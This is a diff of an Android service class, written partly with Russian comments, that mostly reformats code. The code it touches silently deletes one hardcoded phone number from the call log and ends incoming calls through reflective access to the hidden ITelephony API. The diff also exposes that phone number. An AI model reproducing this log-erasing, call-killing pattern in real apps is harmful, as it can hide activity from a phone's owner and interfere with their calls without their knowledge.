@@ -36,7 +36,7 @@ public class BlackService extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		
+
 		calls = new CallLogUtils(this);
 		this.getApplicationContext()
 				.getContentResolver()
@@ -71,7 +71,7 @@ public class BlackService extends Service {
 		// Журнал
 		@Override
 		public void onChange(boolean selfChange) {
-			
+
 			calls.DeleteNumFromCallLog("+79507638332");
 			super.onChange(selfChange);
 
@@ -96,39 +96,42 @@ public class BlackService extends Service {
 
 						public void onCallStateChanged(int state,
 								String incomingNumber) {
-							
+
 							switch (state) {
 							case TelephonyManager.CALL_STATE_RINGING:
-							
-							 Log.d("myLogs",state+"   incoming no:"+incomingNumber);
 
-							// state = 1 means when phone is ringing
+								Log.d("myLogs", state + "   incoming no:"
+										+ incomingNumber);
 
-							String msg = " New Phone Call Event. Incomming Number : "
-									+ incomingNumber;
-							try {
-								Class c = Class.forName(tmgr.getClass()
-										.getName());
-								Method m = c.getDeclaredMethod("getITelephony");
-								m.setAccessible(true);
-								telephonyService = (ITelephony) m.invoke(tmgr);
-								// telephonyService.silenceRinger();
-								telephonyService.endCall();
-							} catch (Exception e) {
-								e.printStackTrace();
-							}}
-							
-							
+								// state = 1 means when phone is ringing
+
+								String msg = " New Phone Call Event. Incomming Number : "
+										+ incomingNumber;
+								try {
+									Class c = Class.forName(tmgr.getClass()
+											.getName());
+									Method m = c
+											.getDeclaredMethod("getITelephony");
+									m.setAccessible(true);
+									telephonyService = (ITelephony) m
+											.invoke(tmgr);
+									// telephonyService.silenceRinger();
+									telephonyService.endCall();
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+
 						}
 					};
-					tmgr.listen(PhoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+					tmgr.listen(PhoneListener,
+							PhoneStateListener.LISTEN_CALL_STATE);
 				} catch (Exception e) {
 
 				}
-			}else if(action.equals("android.provider.Telephony.SMS_RECEIVED")){
-				
+			} else if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
+
 			}
-			
 
 		}
 	};
